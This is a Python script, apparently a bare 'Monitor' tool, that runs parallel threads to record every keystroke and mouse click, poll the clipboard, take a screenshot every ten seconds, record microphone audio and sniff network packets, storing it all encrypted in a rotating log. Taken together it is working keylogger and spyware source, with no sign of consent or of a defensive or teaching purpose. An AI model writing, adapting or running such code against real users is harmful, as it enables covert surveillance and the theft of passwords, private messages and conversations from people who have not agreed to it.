# Import required libraries
import threading  # For creating threads
import json  # For JSON formatting
import logging.config  # For logging configuration
import queue  # For using queues
import pyperclip  # For clipboard interaction
import pyautogui  # For taking screenshots
import sounddevice as sd  # For recording audio
import wavio  # For saving audio in WAV format
from pynput import keyboard, mouse  # For monitoring keyboard and mouse events
from scapy.all import sniff, TCP, UDP  # For network packet sniffing
from cryptography.fernet import Fernet  # For encryption
import configparser  # For reading INI files
import signal  # For signal handling
import sys  # For system operations, including graceful shutdown
import time  # For time-related operations
from contextlib import contextmanager  # For creating context managers
from logging.handlers import RotatingFileHandler  # For rotating log files

# Define a context manager for thread-safe operations
@contextmanager
def thread_lock(lock):
    lock.acquire()  # Acquire the lock
    try:
        yield  # Perform the operation
    finally:
        lock.release()  # Release the lock

# Define function for graceful shutdown
def graceful_shutdown(signum, frame):
    print("Graceful Shutdown initiated.")
    sys.exit(0)  # Exit the program

# Register signal handlers for graceful shutdown
signal.signal(signal.SIGTERM, graceful_shutdown)
signal.signal(signal.SIGINT, graceful_shutdown)

# Read configurations from settings.ini file
config = configparser.ConfigParser()
config.read("settings.ini")

# Initialize logging from logging.ini
logging.config.fileConfig('logging.ini')
logger = logging.getLogger(__name__)

# Attach rotating handler to the logger
handler = RotatingFileHandler('my_log.log', maxBytes=2000, backupCount=10)
logger.addHandler(handler)

# Define the Monitor class
class Monitor:
    def __init__(self, encryption_key):
        self.lock = threading.Lock()  # Thread lock for synchronization
        self.encryption_key = encryption_key  # Encryption key
        self.log_queue = queue.Queue(maxsize=100)  # Queue for logs
        self.log_writer_thread = threading.Thread(target=self.write_log)  # Thread for writing logs
        self.log_writer_thread.start()  # Start the log writer thread

    # Function to write logs
    def write_log(self):
        while True:
            log_item = self.log_queue.get()  # Get log item from queue
            encrypted_data = self.encrypt(json.dumps(log_item))  # Encrypt the log item
            with thread_lock(self.lock):
                timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime())  # Get the current timestamp
                logger.info(f"{timestamp} - {encrypted_data}")  # Write the log

    # Function to log data
    def log(self, data):
        if not self.log_queue.full():
            self.log_queue.put(data)  # Put data into queue

    # Function to encrypt data
    def encrypt(self, data):
        f = Fernet(self.encryption_key)
        encrypted = f.encrypt(data.encode())
        return encrypted.decode()

# Function to monitor clipboard
def monitor_clipboard(monitor):
    recent_value = pyperclip.paste()  # Get the current clipboard value
    while True:
        time.sleep(1)  # Prevent tight loop, add slight delay
        tmp_value = pyperclip.paste()  # Get the new clipboard value
        if tmp_value != recent_value:  # If it has changed
            recent_value = tmp_value  # Update the recent value
            monitor.log({"type": "clipboard", "content": recent_value})  # Log the new clipboard content

# Function to capture screen
def capture_screen(monitor):
    while True:
        screenshot = pyautogui.screenshot()  # Take a screenshot
        screenshot.save("screenshot.png")  # Save the screenshot
        monitor.log({"type": "screenshot", "path": "screenshot.png"})  # Log the screenshot path
        time.sleep(10)  # Sleep for 10 seconds before the next screenshot

# Function to record audio
def record_audio(monitor, duration=5, samplerate=44100):
    while True:
        audio_data = sd.rec(int(samplerate * duration), samplerate=samplerate, channels=2, dtype="int16")  # Record audio
        sd.wait()  # Wait for the recording to finish
        wavio.write("audio.wav", audio_data, samplerate, sampwidth=2)  # Save the audio
        monitor.log({"type": "audio", "path": "audio.wav"})  # Log the audio path

# Function to process network packets
def process_packet(packet, monitor):
    if packet.haslayer(TCP) or packet.haslayer(UDP):  # Check if the packet has TCP or UDP layer
        monitor.log({"type": "network", "summary": packet.summary()})  # Log the packet summary

# Function to monitor network
def network_monitor(monitor):
    sniff(prn=lambda packet: process_packet(packet, monitor))  # Start sniffing

# Main execution starts here
if __name__ == '__main__':
    encryption_key = config.get("Security", "EncryptionKey")  # Get the encryption key from config
    monitor = Monitor(encryption_key)  # Create a Monitor object

    # Create threads for each monitoring function
    threads = [
        threading.Thread(target=monitor_clipboard, args=(monitor,)),
        threading.Thread(target=capture_screen, args=(monitor,)),
        threading.Thread(target=record_audio, args=(monitor,)),
        threading.Thread(target=network_monitor, args=(monitor,))
    ]

    # Start keyboard and mouse listeners
    with keyboard.Listener(on_press=lambda key: monitor.log({"type": "keyboard", "key": str(key)})) as kl, \
         mouse.Listener(on_click=lambda x, y, button, pressed: monitor.log({"type": "mouse", "x": x, "y": y, "button": str(button), "pressed": pressed})) as ml:

        # Start all threads
        for thread in threads:
            thread.start()

        # Wait for keyboard and mouse listeners to terminate
        kl.join()
        ml.join()

        # Wait for all threads to terminate
        for thread in threads:
            thread.join()
